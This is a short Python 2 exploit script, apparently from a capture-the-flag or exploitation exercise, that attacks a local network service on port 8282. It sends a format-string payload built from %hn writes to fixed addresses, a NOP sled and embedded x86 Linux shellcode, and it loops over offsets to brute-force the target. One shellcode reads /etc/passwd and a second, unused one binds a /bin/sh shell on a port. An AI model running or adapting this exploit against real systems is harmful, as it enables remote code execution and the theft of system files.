#!/usr/bin/env python

import socket
import time
from struct import pack

SERVER = "127.0.0.1"
PORT = 8282
BIND_SC = "\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x5f\x97\x93\xb0\x66\x56\x66\x68\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x57\x89\xe1\xcd\x80\xb0\x66\x43\x56\x56\x57\x89\xe1\xcd\x80\x59\x59\xb1\x02\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\x89\xca\xcd\x80"
READ_SC = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/etc/passwd"
ADDR_WRITE = pack("<I", 0x08049c92) + pack("<I", 0x08049c90)

for i in range(0, 100000, 50):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((SERVER, PORT))
    addr_shellcode = "%" + str(int("ffff", 16) - 8) + "x" + "%5$hn" + "%" + str(10000+i) + "x" + "%6$hn"
    payload = ADDR_WRITE + addr_shellcode + "\x90" * 100 + READ_SC
    s.sendall(payload)
    time.sleep(.01)
    res = s.recv(1024)
    print res
    s.close()